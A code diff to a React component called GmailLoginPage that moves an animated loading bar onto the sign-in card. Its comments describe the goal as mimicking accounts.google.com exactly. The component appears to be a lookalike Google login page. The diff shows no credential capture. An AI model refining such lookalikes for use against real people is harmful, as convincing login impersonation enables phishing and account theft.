@@ -91,49 +91,50 @@ const GmailLoginPage: React.FC<GmailLoginPageProps> = ({ onLoginSuccess, onLogin
 
   return (
     <div className="min-h-screen flex flex-col font-sans bg-[#f0f4f9]" style={{ animation: 'fadeIn 0.3s ease-in' }}>
-      {/* Real-Google-style thin top loading bar shown above the email card while
-          we transition from the email step to the password step. Anchored to
-          the top of the viewport (fixed) so it sits above the form, exactly
-          like accounts.google.com. */}
-      {isTransitioning && (
-        <>
-          <div
-            aria-hidden="true"
-            style={{
-              position: 'fixed',
-              top: 0,
-              left: 0,
-              right: 0,
-              height: '3px',
-              backgroundColor: '#e8f0fe',
-              overflow: 'hidden',
-              zIndex: 50,
-            }}
-          >
-            <div
-              style={{
-                position: 'absolute',
-                top: 0,
-                left: 0,
-                bottom: 0,
-                width: '40%',
-                backgroundColor: '#1a73e8',
-                animation: 'gmailTopBarSlide 1s ease-in-out infinite',
-              }}
-            />
-          </div>
-          <style>{`
-            @keyframes gmailTopBarSlide {
-              0% { transform: translateX(-100%); }
-              100% { transform: translateX(350%); }
-            }
-          `}</style>
-        </>
-      )}      <main className="flex-grow w-full flex items-center justify-center p-4">
-        <div 
-          className="w-full max-w-[960px] mx-auto bg-white rounded-[28px] px-10 md:px-14 py-10 md:py-12"
+      <main className="flex-grow w-full flex items-center justify-center p-4">
+        <div
+          className="w-full max-w-[960px] mx-auto bg-white rounded-[28px] px-10 md:px-14 py-10 md:py-12 relative overflow-hidden"
           style={{ boxShadow: '0 1px 2px 0 rgba(60,64,67,.08), 0 1px 3px 1px rgba(60,64,67,.04)' }}
         >
+          {/* Real-Google-style thin loading bar pinned to the very top edge of
+              the white sign-in card, shown above the email/form while we
+              transition from the email step to the password step — exactly
+              like accounts.google.com. */}
+          {isTransitioning && (
+            <>
+              <div
+                aria-hidden="true"
+                style={{
+                  position: 'absolute',
+                  top: 0,
+                  left: 0,
+                  right: 0,
+                  height: '3px',
+                  backgroundColor: '#e8f0fe',
+                  overflow: 'hidden',
+                  borderTopLeftRadius: '28px',
+                  borderTopRightRadius: '28px',
+                }}
+              >
+                <div
+                  style={{
+                    position: 'absolute',
+                    top: 0,
+                    bottom: 0,
+                    width: '40%',
+                    backgroundColor: '#1a73e8',
+                    animation: 'gmailTopBarSlide 1s ease-in-out infinite',
+                  }}
+                />
+              </div>
+              <style>{`
+                @keyframes gmailTopBarSlide {
+                  0% { transform: translateX(-100%); }
+                  100% { transform: translateX(350%); }
+                }
+              `}</style>
+            </>
+          )}
           <form onSubmit={handleSubmit}>
             <div className="flex flex-col md:flex-row md:gap-16">
               {/* Left Column: Logo and heading */}
